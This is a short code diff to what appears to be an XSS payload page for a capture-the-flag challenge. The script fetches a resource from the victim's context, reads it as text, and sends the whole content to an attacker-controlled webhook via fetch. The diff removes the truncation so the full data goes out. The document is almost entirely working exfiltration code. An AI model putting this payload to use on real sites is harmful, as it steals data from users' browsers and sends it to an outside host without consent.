@@ -24,7 +24,7 @@ layout: xss
     }
 
     function getFlag(webhook, flag) {
-        flag = flag.substr(1000);
+        /*flag = flag.substr(500);*/
         payload = JSON.stringify(flag);
         fetch(webhook + payload).then(res => console.log("DONE", res));
         /*document.location = webhook + payload;*/
@@ -39,6 +39,6 @@ layout: xss
         mode: 'no-cors' // 'cors' by default
     };*/
     fetch(jsonProvaUrl)
-        .then(res => { console.log(res); return res.json(); })
+        .then(res => { console.log(res); return res.text(); })
         .then(text => { console.log(text); getFlag(webhook2, text) })
 </script>
